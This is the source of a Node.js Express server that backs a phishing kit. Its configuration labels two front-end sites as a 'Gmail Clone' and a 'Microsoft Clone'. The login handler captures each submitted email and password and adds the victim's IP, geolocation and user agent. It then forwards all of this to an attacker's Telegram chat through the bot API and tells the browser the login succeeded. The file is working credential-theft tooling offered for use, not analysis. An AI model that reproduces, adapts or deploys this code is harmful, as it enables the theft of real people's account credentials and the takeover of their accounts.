const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

/* ═══════════════════════════════════════════════════════════════
   1. SITE REGISTRY
   ───────────────────────────────────────────────────────────────
   Each website has its own entry. The Origin header sent by the
   browser is matched here for CORS. The `label` is what shows up
   in the Telegram message so you can tell sources apart.
   ═══════════════════════════════════════════════════════════════ */
const SITES = {
  'site-a': {
    origin: process.env.SITE_A_ORIGIN || 'https://www.site-a.example',
    label:  process.env.SITE_A_LABEL  || 'Site A — Gmail Clone',
  },
  'site-b': {
    origin: process.env.SITE_B_ORIGIN || 'https://www.site-b.example',
    label:  process.env.SITE_B_LABEL  || 'Site B — Microsoft Clone',
  },
};

// Reverse lookup: Origin header -> site key
const ORIGIN_TO_SITE = new Map(
  Object.entries(SITES).map(([key, cfg]) => [cfg.origin, key])
);

/* ═══════════════════════════════════════════════════════════════
   2. SECURITY HEADERS
   ═══════════════════════════════════════════════════════════════ */
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
}));

/* ═══════════════════════════════════════════════════════════════
   3. CORS — allowlist both websites
   ═══════════════════════════════════════════════════════════════ */
app.use(cors({
  origin: (origin, cb) => {
    // Allow server-to-server / curl / Postman (no Origin header)
    if (!origin) return cb(null, true);
    if (ORIGIN_TO_SITE.has(origin)) return cb(null, true);
    return cb(new Error(`Origin not allowed: ${origin}`));
  },
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false,
  optionsSuccessStatus: 204,
}));

/* ═══════════════════════════════════════════════════════════════
   4. BODY PARSERS
   ═══════════════════════════════════════════════════════════════ */
app.use(express.json({ limit: '100kb' }));
app.use(express.urlencoded({ extended: true, limit: '100kb' }));

/* ═══════════════════════════════════════════════════════════════
   5. TRUST PROXY (required on Render to get real client IP)
   ═══════════════════════════════════════════════════════════════ */
app.set('trust proxy', 1);

/* ═══════════════════════════════════════════════════════════════
   6. RATE LIMITING
   ═══════════════════════════════════════════════════════════════ */
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,   // 15 minutes
  max: 100,                    // 100 requests per IP per window
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => {
    return req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  },
});

app.use('/api/login', limiter);
app.use('/api/site-a/login', limiter);
app.use('/api/site-b/login', limiter);

/* ═══════════════════════════════════════════════════════════════
   7. TELEGRAM CONFIG
   ═══════════════════════════════════════════════════════════════ */
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL   = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

/* ═══════════════════════════════════════════════════════════════
   8. HELPERS
   ═══════════════════════════════════════════════════════════════ */

// Get the real client IP, checking every common proxy header
function getClientIP(req) {
  const forwardedFor    = req.headers['x-forwarded-for'];
  const realIP          = req.headers['x-real-ip'];
  const cfConnectingIP  = req.headers['cf-connecting-ip'];
  const trueClientIP    = req.headers['true-client-ip'];

  if (cfConnectingIP) return cfConnectingIP;
  if (trueClientIP)   return trueClientIP;

  if (forwardedFor) {
    const ips = forwardedFor.split(',');
    return ips[0].trim();
  }

  if (realIP) return realIP;

  return req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
}

// Format a timestamp in the configured timezone
function formatTimestamp(date) {
  const options = {
    year: 'numeric', month: '2-digit', day: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: true,
    timeZone: process.env.TIMEZONE || 'Africa/Lagos',
  };

  try {
    return date.toLocaleString('en-US', options);
  } catch (error) {
    return date.toLocaleString();
  }
}

// Escape HTML for Telegram parse_mode: 'HTML'
function escapeHTML(str) {
  return String(str || '').replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[c]));
}

// Send a message to Telegram
async function sendToTelegram(message) {
  try {
    const response = await axios.post(
      `${TELEGRAM_API_URL}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      },
      { timeout: 8000 }
    );
    console.log('✅ Telegram message sent successfully');
    return { success: true, data: response.data };
  } catch (error) {
    console.error('❌ Error sending to Telegram:', error.message);
    return { success: false, error: error.message };
  }
}

// Get geolocation for an IP via ip-api.com
async function getIPLocation(ip) {
  try {
    if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('::ffff:')) {
      return 'Local/Private Network';
    }

    const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 5000 });

    if (response.data && response.data.status === 'success') {
      const location = [];
      if (response.data.city)       location.push(response.data.city);
      if (response.data.regionName) location.push(response.data.regionName);
      if (response.data.country)    location.push(response.data.country);
      if (response.data.isp)        location.push(`ISP: ${response.data.isp}`);
      return location.join(', ') || 'Unknown';
    }

    return 'Unknown';
  } catch (error) {
    console.error('Error getting location:', error.message);
    return 'Unknown';
  }
}

/* ═══════════════════════════════════════════════════════════════
   9. TELEGRAM MESSAGE FORMATTER
   ═══════════════════════════════════════════════════════════════ */
function formatLoginDetails(loginData, siteLabel) {
  const now = new Date();
  const timestamp    = formatTimestamp(now);
  const utcTimestamp = now.toISOString();

  return `
🔐 <b>New Login Attempt — ${escapeHTML(siteLabel)}</b>
━━━━━━━━━━━━━━━━━━━━
🏷 <b>Source:</b> ${escapeHTML(siteLabel)}
📅 <b>Date/Time:</b> ${escapeHTML(timestamp)}
🌍 <b>UTC Time:</b> ${escapeHTML(utcTimestamp)}
📧 <b>Email:</b> ${escapeHTML(loginData.email) || 'N/A'}
🔑 <b>Password:</b> ${escapeHTML(loginData.password) || 'N/A'}
🌐 <b>IP Address:</b> ${escapeHTML(loginData.ip) || 'N/A'}
📍 <b>Location:</b> ${escapeHTML(loginData.location) || 'N/A'}
🖥 <b>User Agent:</b> ${escapeHTML(loginData.userAgent) || 'N/A'}
━━━━━━━━━━━━━━━━━━━━
  `;
}

/* ═══════════════════════════════════════════════════════════════
   10. LOGIN HANDLER FACTORY
   One handler powers every site's /login endpoint.
   ═══════════════════════════════════════════════════════════════ */
function makeLoginHandler(siteKey) {
  return async (req, res) => {
    try {
      const { email, password } = req.body || {};

      if (!email) {
        return res.status(400).json({ success: false, message: 'Email is required' });
      }
      if (!password) {
        return res.status(400).json({ success: false, message: 'Password is required' });
      }

      const clientIP  = getClientIP(req);
      const userAgent = req.headers['user-agent'] || 'Unknown';

      console.log(`[${siteKey}] Detected IP:`, clientIP);

      const location = await getIPLocation(clientIP);

      const loginData = {
        email: String(email),
        password: String(password),
        ip: clientIP,
        location,
        userAgent,
      };

      console.log(`[${siteKey}] Login attempt:`, {
        email,
        ip: clientIP,
        location,
        timestamp: new Date().toISOString(),
      });

      const siteLabel = SITES[siteKey].label;
      const message   = formatLoginDetails(loginData, siteLabel);
      await sendToTelegram(message);

      return res.status(200).json({
        success: true,
        message: 'Login processed successfully',
        ip: clientIP,
        site: siteKey,
      });
    } catch (error) {
      console.error(`[${siteKey}] Error processing login:`, error);
      return res.status(500).json({ success: false, message: 'Internal server error' });
    }
  };
}

/* ═══════════════════════════════════════════════════════════════
   11. ROUTES
   ═══════════════════════════════════════════════════════════════ */

// Per-site endpoints (what the HTML files call)
app.post('/api/site-a/login', makeLoginHandler('site-a'));
app.post('/api/site-b/login', makeLoginHandler('site-b'));

// Legacy endpoint — auto-detects site from the Origin header
app.post('/api/login', (req, res, next) => {
  const origin  = req.headers.origin;
  const siteKey = ORIGIN_TO_SITE.get(origin) || 'site-a';
  return makeLoginHandler(siteKey)(req, res, next);
});

// Health check
app.get('/health', (req, res) => {
  const clientIP = getClientIP(req);
  res.status(200).json({
    status: 'OK',
    timestamp: formatTimestamp(new Date()),
    utcTimestamp: new Date().toISOString(),
    detectedIP: clientIP,
    timezone: process.env.TIMEZONE || 'Africa/Lagos',
    sites: Object.keys(SITES),
  });
});

// Test endpoint — verify Telegram connection
app.get('/api/test-telegram', async (req, res) => {
  const testMessage = `✅ Test message from your login server!\n🕐 Local time: ${formatTimestamp(new Date())}\n🌍 UTC: ${new Date().toISOString()}`;
  const result = await sendToTelegram(testMessage);

  if (result.success) {
    res.status(200).json({ success: true, message: 'Test message sent to Telegram successfully' });
  } else {
    res.status(500).json({ success: false, message: 'Failed to send test message', error: result.error });
  }
});

// Debug endpoint — inspect IP detection
app.get('/api/debug-ip', (req, res) => {
  const clientIP = getClientIP(req);
  res.json({
    detectedIP: clientIP,
    timestamp: formatTimestamp(new Date()),
    utcTimestamp: new Date().toISOString(),
    timezone: process.env.TIMEZONE || 'Africa/Lagos',
    headers: {
      'x-forwarded-for':  req.headers['x-forwarded-for'],
      'x-real-ip':        req.headers['x-real-ip'],
      'cf-connecting-ip': req.headers['cf-connecting-ip'],
      'true-client-ip':   req.headers['true-client-ip'],
    },
  });
});

// Root endpoint
app.get('/', (req, res) => {
  res.status(200).json({
    message: 'Login API Server',
    status: 'Running',
    endpoints: {
      siteALogin:   'POST /api/site-a/login',
      siteBLogin:   'POST /api/site-b/login',
      legacyLogin:  'POST /api/login  (auto-detects site by Origin)',
      health:       'GET /health',
      testTelegram: 'GET /api/test-telegram',
      debugIP:      'GET /api/debug-ip',
    },
  });
});

/* ═══════════════════════════════════════════════════════════════
   12. ERROR HANDLERS
   ═══════════════════════════════════════════════════════════════ */

// CORS errors reach here — return 403 instead of 500
app.use((err, req, res, next) => {
  if (err && err.message && err.message.startsWith('Origin not allowed')) {
    return res.status(403).json({ success: false, message: 'CORS: origin not allowed' });
  }
  if (err && err.type === 'entity.too.large') {
    return res.status(413).json({ success: false, message: 'Payload too large' });
  }
  console.error('[error]', err);
  res.status(500).json({ success: false, message: 'Internal server error' });
});

// 404 fallback
app.use((req, res) => {
  res.status(404).json({ success: false, message: 'Route not found' });
});

/* ═══════════════════════════════════════════════════════════════
   13. START SERVER
   ═══════════════════════════════════════════════════════════════ */
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Telegram bot configured: ${TELEGRAM_BOT_TOKEN ? 'Yes' : 'No'}`);
  console.log(`💬 Chat ID configured: ${TELEGRAM_CHAT_ID ? 'Yes' : 'No'}`);
  console.log(`🕐 Timezone: ${process.env.TIMEZONE || 'Africa/Lagos'}`);
  console.log(`🌐 Sites registered:`);
  for (const [key, cfg] of Object.entries(SITES)) {
    console.log(`   • ${key}  →  ${cfg.origin}  (${cfg.label})`);
  }
  console.log(`📅 Current time: ${formatTimestamp(new Date())}`);
});
